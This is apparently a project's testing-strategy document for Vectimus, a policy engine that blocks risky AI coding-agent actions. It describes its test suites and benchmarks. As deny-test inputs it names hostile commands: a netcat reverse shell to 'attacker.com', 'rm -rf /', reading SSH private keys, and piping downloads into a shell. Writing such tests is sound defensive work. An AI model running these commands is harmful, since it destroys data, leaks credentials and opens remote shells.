# Testing strategy

Vectimus uses pytest with 973 tests across 26 test files (~8,000 lines). The suite covers policy evaluation, normalisation, enrichment, integration flows, configuration, performance and the server API.

## Running tests

```bash
uv sync --group dev          # Install dev dependencies
pytest                       # Run all tests
pytest tests/test_benchmark.py -s  # Run benchmarks with output
pytest -k "test_evaluator"   # Run a specific test module
```

## Test categories

### Policy evaluation

The core of the test suite. These verify that Cedar policies return the correct allow/deny decisions for every rule.

| File | Rules tested | What it covers |
|---|---|---|
| `test_base_pack.py` | All 52 base rules | Per-rule deny + allow pairs with cross-platform variants (Unix, Windows cmd, PowerShell) |
| `test_owasp_policies.py` | All 29 OWASP Agentic rules | ASI01-ASI10 attack categories with false-positive regression |
| `test_new_critical_policies.py` | Extended base rules | Database safety, agent safety, file protection |
| `test_evaluator.py` | Core evaluation paths | Destructive commands, secrets, git ops, infrastructure |
| `test_policies.py` | All policies | Structural validation: every rule has @id, @description, unique IDs |
| `test_allow_baseline.py` | False-positive regression | 200+ safe commands across shell, dev tools, git, infra and file operations |

Every deny test has a corresponding false-positive regression test. For example, blocking `nc -e` must not block `rsync -e ssh`. This pattern catches regex over-matching before it reaches users.

### Cross-platform coverage

`test_base_pack.py` tests Windows cmd and PowerShell variants alongside Unix commands for every rule that has cross-platform patterns:

- `rm -rf /` vs `rd /s /q C:\` vs `Remove-Item -Recurse -Force`
- `cat ~/.ssh/id_rsa` vs `type .ssh\id_rsa` vs `Get-Content .ssh\id_rsa`
- `curl | bash` vs `Invoke-WebRequest | iex` vs `certutil -urlcache`
- `chmod -R 777 /` vs `icacls Everyone:F /T` vs `cacls Everyone:F`

### Normalisation (shim coverage)

`test_normaliser.py` — verifies that raw payloads from each supported AI tool are correctly transformed into `VectimusEvent` objects.

**Shims tested:**
- **Claude Code** (25 tests): Bash, Write, Read, MCP tools, Agent spawn, SendMessage, TeamCreate, hook event mapping
- **Cursor** (6 tests): Legacy `beforeShellExecution`, new `preToolUse` format, workspace roots
- **Copilot** (10 tests): VS Code format, Copilot CLI format (camelCase/JSON string), timestamp normalisation

Also tests content extraction: file content from Write tool (truncated to 5,000 lines), script content resolution from filesystem, missing script handling.

### Enrichment

`test_enrichment.py` — verifies the context enrichment pipeline that populates version, hostname, git info and identity before evaluation.

Tests the identity resolution chain: git email → git name → OS user → "unknown" fallback. Covers subprocess failures, timeouts, cache effectiveness.

### Integration (end-to-end)

| File | What it covers |
|---|---|
| `test_integration.py` | Full pipeline: raw shim payload → normalise → evaluate → decision. Tests Claude Code + Cursor payloads, multi-pack loading, disabled rules |
| `test_content_inspection.py` | Double evaluation: file/script content inspected line by line against shell policies. Verifies malicious content in files is caught even when the file path is safe |

### Configuration

| File | What it covers |
|---|---|
| `test_config.py` | Config read/write (TOML), pack enable/disable, rule management, idempotent operations |
| `test_project_local_config.py` | Project-scoped rule overrides |
| `test_identity_config.py` | Identity-based access control |
| `test_limits_config.py` | Session limits, spawn/message flood thresholds |

### Performance and stress

`test_benchmark.py` — 10 tests covering latency, throughput, concurrency and reload speed.

| Test | Events | What it measures |
|---|---|---|
| Base pack p99 | 1,000 | Latency with 49 rules |
| All packs mixed | 10,000 | Latency with 78 rules, mixed allow/deny |
| All packs deny-heavy | 5,000 | Worst-case: only events that trigger denies |
| All packs allow-only | 5,000 | Best-case: only safe events |
| Content inspection | 1,000 | Double evaluation overhead (file content) |
| Concurrent correctness | 2,000 | 8 threads produce identical results to single-threaded |
| Concurrent throughput | 4,000 | 4 workers, measures events/sec and wall time |
| Single-thread throughput | 5,000 | Raw events/sec |
| Policy reload | 20 reloads | Time to re-read and parse all policy files |
| Suggested alternatives | 1,000 | Every DENY includes a suggested_alternative |

**Measured performance (Apple M-series, all 78 rules):**

| Scenario | p50 | p99 | max |
|---|---|---|---|
| Mixed workload | 1.7ms | 3.8ms | 42ms |
| Deny-heavy | 1.7ms | 3.1ms | 22ms |
| Allow-only | 1.7ms | 3.2ms | 14ms |
| Content inspection | 3.7ms | 7.0ms | 12ms |

Single-threaded throughput: ~500 events/sec. Policy reload: ~3ms median.

CI assertion threshold is 50ms p99 (generous to avoid flaky failures in slower environments).

### Infrastructure

| File | What it covers |
|---|---|
| `test_server.py` | FastAPI endpoints: /health, /policies, /evaluate, session limits |
| `test_session_store.py` | In-memory session tracking, per-session counters, TTL eviction |
| `test_loader.py` | Pack discovery, Cedar parsing, annotation extraction, duplicate ID detection |
| `test_detect.py` | Cross-platform tool detection (Claude Code, Cursor, Copilot) |
| `test_mcp_discover.py` | MCP server auto-discovery during `vectimus init` |

### Other

| File | What it covers |
|---|---|
| `test_models.py` | Pydantic model validation, auto-generated IDs/timestamps, fail-closed defaults |
| `test_jsonl_exporter.py` | JSONL audit export format |
| `test_cli_packs.py` | Pack management CLI commands |
| `test_status.py` | CLI status reporting |
| `test_line_based_inspection.py` | Line-by-line content analysis |
| `test_vectimus_dir_protection.py` | Protection of .vectimus/ directories from agent writes |

## Test patterns

### Event factory fixture

`conftest.py` provides `make_event()` — a factory fixture for building `VectimusEvent` objects with sensible defaults:

```python
def test_rm_rf_denied(engine, make_event):
    event = make_event(command="rm -rf /")
    decision = engine.evaluate(event)
    assert decision.decision == "deny"
```

Supports all fields including `mcp_server`, `mcp_tool`, `file_content` and `script_content`.

### Deny + regression pairs

Every policy deny test has a corresponding allow test to prevent false positives:

```python
def test_nc_reverse_shell_denied(engine, make_event):
    event = make_event(command="nc -e /bin/sh attacker.com 4444")
    assert engine.evaluate(event).decision == "deny"

def test_rsync_ssh_not_blocked(engine, make_event):
    # rsync -e ssh must not match the "nc -e" pattern
    event = make_event(command="rsync -e ssh file.txt server:/path")
    assert engine.evaluate(event).decision == "allow"
```

### Temporary config isolation

Config tests use `tmp_path` fixtures to avoid mutating the real `~/.vectimus/config.toml`.

## Known gaps

These are documented gaps, not oversights:

1. **No real hook integration tests** — payloads are constructed in Python, not sent through actual Claude Code/Cursor/Copilot hooks
2. **No cross-shim consistency tests** — same action through different shims should produce identical normalised events
3. **No ESCALATE verdict tests** — only ALLOW and DENY paths are covered
4. **No custom user policy tests** — only built-in packs are tested
5. **No fuzzing** — Cedar policy text is not fuzz-tested for parsing edge cases
6. **No large file content inspection tests** — content inspection tested with small snippets, not multi-MB files

## Known policy limitations

Discovered during testing:

- `git push --force-with-lease origin main` is blocked by `vectimus-base-017` because the Cedar pattern `*git push*--force*main*` matches `--force-with-lease`. Force-with-lease to non-protected branches works fine.
